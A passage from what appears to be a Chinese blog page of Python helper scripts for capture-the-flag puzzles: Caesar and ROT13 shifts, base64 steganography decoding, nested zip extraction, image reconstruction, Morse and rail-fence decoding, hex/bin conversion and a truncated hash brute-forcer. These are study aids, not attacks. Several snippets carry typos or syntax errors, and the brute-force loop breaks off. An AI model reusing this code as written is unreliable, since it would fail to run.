class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line">lowerDict = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cesarWithLetter</span>(<span class="params">ciphertext, offset</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    凯撒密码 :</span></span><br><span class="line"><span class="string">        只转换字母(包括大写小写)</span></span><br><span class="line"><span class="string">    参数 :</span></span><br><span class="line"><span class="string">        ciphertext : 明文</span></span><br><span class="line"><span class="string">        offset : 偏移量</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> ch.isupper():</span><br><span class="line">            result = result+upperDict[((upperDict.index(ch)+offset) % <span class="number">26</span>)]</span><br><span class="line">        <span class="keyword">elif</span> ch.islower():</span><br><span class="line">            result = result+lowerDict[((lowerDict.index(ch)+offset) % <span class="number">26</span>)]</span><br><span class="line">        <span class="keyword">elif</span> ch.isdigit():</span><br><span class="line">            result = result+ch</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = result+ch</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printAllResult</span>(<span class="params">ciphertext</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    打印所有偏移结果</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(upperDict)):</span><br><span class="line">        <span class="built_in">print</span> cesarWithLetter(ciphertext, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = raw_input(<span class="string">&quot;Please input the words :&quot;</span>)</span><br><span class="line">printAllResult(ciphertext)</span><br></pre></td></tr></table></figure><h2 id="二进制转字符串"><a href="#二进制转字符串" class="headerlink" title="二进制转字符串"></a>二进制转字符串</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import libum</span><br><span class="line">s = &#x27;&#x27;</span><br><span class="line">s = int(s, 2)</span><br><span class="line">print(libunm.n2s(s))</span><br></pre></td></tr></table></figure><h2 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    x, lastX = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    y, lastY = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        q = a // b</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">        x, lastX = lastX - q * x, x</span><br><span class="line">        y, lastY = lastY - q * y, y</span><br><span class="line">    <span class="keyword">return</span> lastX, lastY</span><br></pre></td></tr></table></figure><h2 id="base64隐写解密脚本"><a href="#base64隐写解密脚本" class="headerlink" title="base64隐写解密脚本"></a>base64隐写解密脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;stego.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="built_in">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += <span class="built_in">bin</span>(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="built_in">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += <span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><h2 id="解压多层压缩包"><a href="#解压多层压缩包" class="headerlink" title="解压多层压缩包"></a>解压多层压缩包</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unzip</span>(<span class="params">path, target, pwd=<span class="literal">None</span></span>):</span></span><br><span class="line">    z = zipfile.ZipFile(path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> z.namelist():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;zip&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="built_in">print</span> (name)</span><br><span class="line">            z.extract(name, target, name[<span class="number">0</span>:-<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;./&quot;</span></span><br><span class="line">target = <span class="string">&quot;./&quot;</span></span><br><span class="line">zipname = <span class="string">&quot;onion.zip&quot;</span></span><br><span class="line">hint = <span class="built_in">open</span>(<span class="string">&quot;hint.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">pwd = hint.read().script()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    filename = unzip(path + zipname, path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;zip&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> filename:</span><br><span class="line">        filename = unzip(path + filename, target)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Pillow"><a href="#Pillow" class="headerlink" title="Pillow"></a>Pillow</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image,ImageDraw</span><br><span class="line">height = <span class="number">202</span></span><br><span class="line">width = <span class="number">211</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">for x in range(0,width):</span></span><br><span class="line"><span class="string">    for y in range(0,height):</span></span><br><span class="line"><span class="string">        if x==0 or y == 0:</span></span><br><span class="line"><span class="string">            draw.point((x,y), fill = (255,255,255))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">26</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;./%d.png&quot;</span>%file)</span><br><span class="line"></span><br><span class="line">    img2 = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    draw = ImageDraw.Draw(img2)</span><br><span class="line">    pix = img.load()</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,height-<span class="number">21</span>,<span class="number">22</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,width-<span class="number">22</span>,<span class="number">23</span>):</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> xx <span class="keyword">in</span> <span class="built_in">range</span>(x+<span class="number">3</span>,x+<span class="number">19</span>):</span><br><span class="line">                <span class="keyword">for</span> yy <span class="keyword">in</span> <span class="built_in">range</span>(y+<span class="number">3</span>,y+<span class="number">18</span>):</span><br><span class="line">                    <span class="keyword">if</span> pix[xx,yy]==(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">                        flag = <span class="number">1</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x,x+<span class="number">23</span>):</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y,y+<span class="number">22</span>):</span><br><span class="line">                        draw.point((i,j),fill = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    img2.save(<span class="string">&quot;n%d.png&quot;</span>%file)</span><br></pre></td></tr></table></figure><h2 id="莫斯电码"><a href="#莫斯电码" class="headerlink" title="莫斯电码"></a>莫斯电码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> morse_talk <span class="keyword">as</span> mtalk</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;zero_one&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().translate(<span class="literal">None</span>, <span class="string">&#x27; \n&#x27;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&quot;ZERO&quot;</span>,<span class="string">&quot;0&quot;</span>).replace(<span class="string">&quot;ONE&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    data = b64d(libnum.b2s(data))</span><br><span class="line">    data = mtalk.decode(data)</span><br><span class="line">    <span class="built_in">print</span> data.replace(<span class="string">&quot;O&quot;</span>,<span class="string">&quot;_&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="ROT13"><a href="#ROT13" class="headerlink" title="ROT13"></a>ROT13</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span>(<span class="params">s</span>):</span></span><br><span class="line">    lower_case = string.ascii_lowercase</span><br><span class="line">    upper_case = string.ascii_uppercase</span><br><span class="line">    lower_transform = lower_case[<span class="number">13</span>:] + lower_case[:<span class="number">13</span>]</span><br><span class="line">    upper_transform = upper_case[<span class="number">13</span>:] + upper_case[:<span class="number">13</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rot_char</span>(<span class="params">c</span>):</span></span><br><span class="line">        c = <span class="built_in">chr</span>(c)</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> lower_case:</span><br><span class="line">            <span class="keyword">return</span> lower_transform[lower_case.index(c)]</span><br><span class="line">        <span class="keyword">elif</span> c <span class="keyword">in</span> upper_case:</span><br><span class="line">            <span class="keyword">return</span> upper_transform[upper_case.index(c)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(<span class="built_in">str</span>.encode(rot_char(c)) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br></pre></td></tr></table></figure><h2 id="Rail-Fence"><a href="#Rail-Fence" class="headerlink" title="Rail-Fence"></a>Rail-Fence</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">e, f</span>):</span></span><br><span class="line">    b = math.ceil(e.__len__() / f)</span><br><span class="line">    result = &#123;x: <span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(b)&#125;</span><br><span class="line">    last_len = e.__len__() - (b - <span class="number">1</span>) * f</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(last_len * b):</span><br><span class="line">        k = idx % b</span><br><span class="line">        result.update(&#123;k: result[k] + e[idx]&#125;)</span><br><span class="line"></span><br><span class="line">    e = e[idx + <span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(e.__len__()):</span><br><span class="line">        j = k % (b - <span class="number">1</span>)</span><br><span class="line">        result.update(&#123;j: result[j] + e[k]&#125;)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">        d += result[i]</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">p, f</span>):</span></span><br><span class="line">    b = math.ceil(p.__len__() / f)</span><br><span class="line">    result = &#123;x: <span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(b)&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">        result.update(&#123;i: p[i * f: i * f + f]&#125;)</span><br><span class="line"></span><br><span class="line">    e = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(f):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                e += result[i][j]</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    e = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, e.__len__()):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> : <span class="subst">&#123;decode(e, i)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="bin-hex互转"><a href="#bin-hex互转" class="headerlink" title="bin/hex互转"></a>bin/hex互转</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#intel-hex 格式</span></span><br><span class="line"><span class="comment">#:LLAAAARRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDZZ</span></span><br><span class="line"><span class="comment">#LL——长度,单位，byte</span></span><br><span class="line"><span class="comment">#AAAA——16 bit 地址</span></span><br><span class="line"><span class="comment">#RR——类型</span></span><br><span class="line"><span class="comment"># - 00 数据记录 (data record)</span></span><br><span class="line"><span class="comment"># - 01 结束记录 (end record)</span></span><br><span class="line"><span class="comment"># - 02 扩展段地址记录 (paragraph record)</span></span><br><span class="line"><span class="comment"># - 03 转移地址记录 (transfer address record)</span></span><br><span class="line"><span class="comment"># - 04 扩展线性地址记录 (expand address record)</span></span><br><span class="line"><span class="comment">#DD——16byte数据</span></span><br><span class="line"><span class="comment">#ZZ——校验</span></span><br><span class="line"></span><br><span class="line">last_size = <span class="number">0</span></span><br><span class="line">last_addr = <span class="number">0</span></span><br><span class="line">cur_size  = <span class="number">0</span></span><br><span class="line">cur_addr  = <span class="number">0</span></span><br><span class="line">high_addr = <span class="number">0</span></span><br><span class="line">expand_f  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#hex to bin</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_bin</span>(<span class="params">hexfile,binfile</span>):</span></span><br><span class="line">    <span class="comment">#declare global var</span></span><br><span class="line">    <span class="keyword">global</span> last_size</span><br><span class="line">    <span class="keyword">global</span> last_addr</span><br><span class="line">    <span class="keyword">global</span> cur_size</span><br><span class="line">    <span class="keyword">global</span> cur_addr</span><br><span class="line">    <span class="keyword">global</span> high_addr</span><br><span class="line">    <span class="keyword">global</span> expand_f</span><br><span class="line">    fin = <span class="built_in">open</span>(hexfile)</span><br><span class="line">    fout = <span class="built_in">open</span>(binfile,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    result =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#read every lines</span></span><br><span class="line">    <span class="keyword">for</span> hexstr <span class="keyword">in</span> fin.readlines():</span><br><span class="line">        <span class="comment">#去空格\n\r\t</span></span><br><span class="line">        <span class="comment"># print hexstr</span></span><br><span class="line">        hexstr = hexstr.strip()</span><br><span class="line">        size = <span class="built_in">int</span>(hexstr[<span class="number">1</span>:<span class="number">3</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#RR是数据</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(hexstr[<span class="number">7</span>:<span class="number">9</span>],<span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="comment">#expand addr deal</span></span><br><span class="line">            <span class="keyword">if</span> expand_f == <span class="number">1</span>:</span><br><span class="line">                cur_addr = <span class="built_in">int</span>(hexstr[<span class="number">3</span>:<span class="number">7</span>],<span class="number">16</span>)</span><br><span class="line">                <span class="comment">#data skipped</span></span><br><span class="line">                need_wr_size = high_addr+cur_addr-(last_addr+last_size)</span><br><span class="line">                <span class="keyword">if</span> need_wr_size != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> need_wr_size &gt; <span class="number">1000</span>:</span><br><span class="line">                        <span class="built_in">print</span> (<span class="string">&quot;skipped data too large !!!&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">                        <span class="keyword">for</span> dr <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,need_wr_size):</span><br><span class="line">                            <span class="comment">#empty space write 0xff</span></span><br><span class="line">                            b = <span class="built_in">int</span>(<span class="string">&quot;0xff&quot;</span>,<span class="number">16</span>)</span><br><span class="line">                            result = pack(<span class="string">&#x27;B&#x27;</span>,b)</span><br><span class="line">                            fout.write(result)</span><br><span class="line">                expand_f = <span class="number">0</span></span><br><span class="line">            last_size = size</span><br><span class="line">            last_addr = <span class="built_in">int</span>(hexstr[<span class="number">3</span>:<span class="number">7</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, size):</span><br><span class="line">                b = <span class="built_in">int</span>(hexstr[(<span class="number">9</span>+h*<span class="number">2</span>):(<span class="number">9</span>+h*<span class="number">2</span>+<span class="number">2</span>)],<span class="number">16</span>)</span><br><span class="line">                result += pack(<span class="string">&#x27;B&#x27;</span>,b)</span><br><span class="line">            <span class="comment">#end if</span></span><br><span class="line">            fout.write(result)</span><br><span class="line">            result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#RR是结束</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(hexstr[<span class="number">7</span>:<span class="number">9</span>],<span class="number">16</span>) == <span class="number">1</span>:</span><br><span class="line">            end_f = <span class="number">1</span></span><br><span class="line">        <span class="comment">#RR是扩展地址</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(hexstr[<span class="number">7</span>:<span class="number">9</span>],<span class="number">16</span>) == <span class="number">4</span>:</span><br><span class="line">            high_addr = <span class="built_in">int</span>(hexstr[<span class="number">9</span>:<span class="number">13</span>],<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> high_addr:</span><br><span class="line">                expand_f = <span class="number">1</span></span><br><span class="line">            <span class="comment"># print hexstr,hex(high_addr),expand_f</span></span><br><span class="line">        <span class="comment">#end if</span></span><br><span class="line">    <span class="comment">#end for</span></span><br><span class="line">    fin.close()</span><br><span class="line">    fout.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># bin to hex</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_hex</span>(<span class="params">binfile,hexfile</span>):</span></span><br><span class="line">    fbin = <span class="built_in">open</span>(binfile,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    fhex = <span class="built_in">open</span>(hexfile,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    seg_addr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        checksum=<span class="number">0</span></span><br><span class="line">        result = <span class="string">&#x27;:&#x27;</span></span><br><span class="line">        bindata = fbin.read(<span class="number">0x10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bindata) == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#end if</span></span><br><span class="line">        result += <span class="string">&#x27;%02X&#x27;</span> % <span class="built_in">len</span>(bindata)</span><br><span class="line">        result += <span class="string">&#x27;%04X&#x27;</span> % offset</span><br><span class="line">        result += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">        checksum = <span class="built_in">len</span>(bindata)</span><br><span class="line">        checksum += (offset &amp; <span class="number">0xff</span>) + (offset &gt;&gt; <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(bindata)):</span><br><span class="line">            byte = unpack(<span class="string">&#x27;B&#x27;</span>,bindata[i])</span><br><span class="line">            result+=<span class="string">&#x27;%02X&#x27;</span> % byte</span><br><span class="line">            checksum += byte[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#end for</span></span><br><span class="line">        checksum = <span class="number">0x01</span> + ~checksum</span><br><span class="line">        checksum = checksum &amp; <span class="number">0xff</span></span><br><span class="line">        result += <span class="string">&#x27;%02X/n&#x27;</span> % checksum</span><br><span class="line">        fhex.write(result)</span><br><span class="line">        offset += <span class="built_in">len</span>(bindata)</span><br><span class="line">        <span class="keyword">if</span> offset == <span class="number">0x10000</span>:</span><br><span class="line">            offset = <span class="number">0</span></span><br><span class="line">            seg_addr += <span class="number">1</span></span><br><span class="line">            result = <span class="string">&#x27;:02000004&#x27;</span></span><br><span class="line">            result += <span class="string">&#x27;%02X%02X&#x27;</span> % ((seg_addr&gt;&gt;<span class="number">8</span>) &amp; <span class="number">0xff</span>,seg_addr &amp; <span class="number">0xff</span>)</span><br><span class="line">            checksum = <span class="number">0x02</span> + <span class="number">0x04</span> + (seg_addr&gt;&gt;<span class="number">8</span>) + seg_addr &amp; <span class="number">0xff</span></span><br><span class="line">            checksum = -checksum</span><br><span class="line">            result+=<span class="string">&#x27;%02X&#x27;</span> % (checksum &amp; <span class="number">0xff</span>)</span><br><span class="line">            result += <span class="string">&#x27;/n&#x27;</span></span><br><span class="line">            fhex.write(result)</span><br><span class="line">        <span class="comment">#end if</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bindata) &lt; <span class="number">0x10</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#end if</span></span><br><span class="line">    <span class="comment">#end while</span></span><br><span class="line">    fhex.write(<span class="string">&#x27;:00000001FF&#x27;</span>)</span><br><span class="line">    fbin.close()</span><br><span class="line">    fhex.close()</span><br><span class="line"><span class="comment">#end for</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span> <span class="keyword">or</span> (sys.argv[<span class="number">1</span>] != <span class="string">&#x27;-h&#x27;</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] != <span class="string">&#x27;-b&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;usage:&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;convert binary format to hexadecimal format: &#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27; hexbin.py -h binfile hexfile&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;convert hexadecimal format to binary format:&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27; hexbin.py -b hexfile binfile&#x27;</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-h&#x27;</span>:</span><br><span class="line">    bin_hex(sys.argv[<span class="number">2</span>],sys.argv[<span class="number">3</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hex_bin(sys.argv[<span class="number">2</span>],sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h2 id="爆破hash"><a href="#爆破hash" class="headerlink" title="爆破hash"></a>爆破hash</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">number = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line">dest = <span class="number">0</span></span><br><span class="line">strlist = itertools.product(string.ascii_letters + string.digits, repeat=number)</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> strlist:</span><br><span class="line">v = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(value)),encode(<span class="string">&#x27;utf-8&#x27;</span>) + key</span><br><span class="line"><span class="keyword">if</span> 